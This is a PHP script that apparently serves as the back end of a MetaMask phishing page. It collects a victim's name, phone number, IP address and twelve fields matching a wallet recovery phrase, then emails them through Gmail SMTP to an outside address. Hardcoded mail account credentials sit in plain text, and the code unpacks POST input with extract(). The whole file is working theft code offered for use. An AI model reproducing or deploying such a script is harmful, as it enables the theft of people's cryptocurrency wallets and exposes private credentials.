<?php

extract($_POST);

$ip = $_SERVER['REMOTE_ADDR'];
require 'PHPMailer/PHPMailerAutoload.php';
require 'PHPMailer/class.phpmailer.php';


    $customerEmailer = '<!DOCTYPE html>
                                <html>
                                    <head>
                                        <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
                                        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
                                        <style>p{ margin:0 !important; padding:0 !important;}</style>
                                    </head>
                                    <body>
                                         <p>Full Name : ' . @$name . '</p>
                                        <p>Phone Number : ' . @$number . '</p>
                                        <p>All Fields : ' . @$field_1 ." - ". @$field_2 ." - ". @$field_2." - ". @$field_3." - ". @$field_4." - ". @$field_5." - ". @$field_6." - ". @$field_7." - ". @$field_8." - ". @$field_9." - ". @$field_10." - ". @$field_11." - ". @$field_12.  '</p>
                                        <p>IP : ' . $ip . '</p>
                                        </body>
                                </html>';
    $subject = 'Alert - Metamask Extensions Details Received';
 

$message = $customerEmailer;
$toAddress = 'brownbdrown@gmail.com';
$toAddress1 = 'brownbdrown@gmail.com';
$fromTitle = $_SERVER['HTTP_HOST'];
$fromEmail = 'details@' . $_SERVER['HTTP_HOST'];
$mail = new PHPMailer;
//$mail->IsSMTP();
//$mail->Mailer = 'smtp';
$mail->SMTPDebug = 2;
$mail->Host = 'smtp.gmail.com';
$mail->SMTPAuth = true;
$mail->Username = 'morissteve999@gmail.com';
$mail->Password = 'Abhi@4321';
$mail->SMTPSecure = 'tls';
$mail->Port = 587;
$mail->setFrom($fromEmail, $fromTitle);
$mail->addAddress($toAddress);
$mail->AddCC($toAddress1);
$mail->isHTML(true);
$mail->Subject = $subject;
$mail->Body = $message;
$mailS = $mail->send();
?>